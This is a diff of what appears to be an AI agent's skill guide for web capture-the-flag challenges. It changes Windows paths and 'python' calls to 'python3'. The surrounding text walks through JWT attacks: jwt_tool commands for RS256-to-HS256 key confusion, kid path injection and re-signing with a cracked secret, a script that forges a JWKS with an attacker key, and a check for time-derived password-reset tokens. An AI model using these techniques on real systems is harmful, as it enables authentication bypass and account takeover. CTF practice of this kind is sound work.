@@ -33,7 +33,7 @@ Record the working endpoint, mechanism, and **all** user data returned (id, role
 
 JWT returned → decode and run the fast-track immediately:
 ```bash
-python /c/Tools/jwt_tool/jwt_tool.py <token>
+python3 ~/Tools/jwt_tool/jwt_tool.py <token>
 ```
 
 ## 2. JWT fast-track
@@ -54,7 +54,7 @@ list means the secret is exotic** — plain common words are still a common auth
 that's exactly what the second stage is for, not an unlikely-to-pay-off escape hatch.
 
 ```bash
-python ~/.claude/skills/web-ctf/scripts/jwtquick.py --token "$TOKEN" \
+python3 ~/.claude/skills/web-ctf/scripts/jwtquick.py --token "$TOKEN" \
   --base <target> --test /api/admin/stats
 ```
 
@@ -127,9 +127,9 @@ concluding.
 ## 3. JWT deep-dive (only with a new primitive)
 
 ```bash
-python /c/Tools/jwt_tool/jwt_tool.py "$TOKEN" -X k -pk recon/pubkey.pem   # RS256→HS256 confusion
-python /c/Tools/jwt_tool/jwt_tool.py "$TOKEN" -I -hc kid -hv "../../dev/null"  # kid injection
-python /c/Tools/jwt_tool/jwt_tool.py "$TOKEN" -T -S hs256 -p "<secret>"
+python3 ~/Tools/jwt_tool/jwt_tool.py "$TOKEN" -X k -pk recon/pubkey.pem   # RS256→HS256 confusion
+python3 ~/Tools/jwt_tool/jwt_tool.py "$TOKEN" -I -hc kid -hv "../../dev/null"  # kid injection
+python3 ~/Tools/jwt_tool/jwt_tool.py "$TOKEN" -T -S hs256 -p "<secret>"
 ```
 
 ### JWKS substitution (requires upload write-traversal — see traversal-upload.md)
@@ -139,7 +139,7 @@ python3 << 'EOF'
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives import serialization
 import json, base64, os
-os.makedirs('C:/Tools/CTF/<challenge-name>/exploits', exist_ok=True)
+os.makedirs('~/Tools/CTF/<challenge-name>/exploits', exist_ok=True)
 private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
 pub = private_key.public_key().public_numbers()
 def b64u(n):
@@ -147,10 +147,10 @@ def b64u(n):
     return base64.urlsafe_b64encode(n.to_bytes(l,'big')).rstrip(b'=').decode()
 kid = "pwned"
 jwks = {"keys":[{"kty":"RSA","use":"sig","alg":"RS256","kid":kid,"n":b64u(pub.n),"e":b64u(pub.e)}]}
-open('C:/Tools/CTF/<challenge-name>/exploits/private_key.pem','wb').write(
+open('~/Tools/CTF/<challenge-name>/exploits/private_key.pem','wb').write(
     private_key.private_bytes(serialization.Encoding.PEM,
         serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
-json.dump(jwks, open('C:/Tools/CTF/<challenge-name>/exploits/jwks.json','w'))
+json.dump(jwks, open('~/Tools/CTF/<challenge-name>/exploits/jwks.json','w'))
 print("Done. KID:", kid)
 EOF
 ```
@@ -174,7 +174,7 @@ Often the softest path to admin. Map the flow first: `POST /api/forgot-password 
 **Inspect the token's entropy before attacking anything else.** Request one for your own account, read it, and test whether it's derived from time:
 
 ```bash
-python -c "print(int('<token>',16))"   # compare against the mail timestamp in epoch ms
+python3 -c "print(int('<token>',16))"   # compare against the mail timestamp in epoch ms
 ```
 
 A token equal to `Date.now().toString(16)` has **zero entropy** — it's a hex millisecond. To exploit, you need the generation instant:
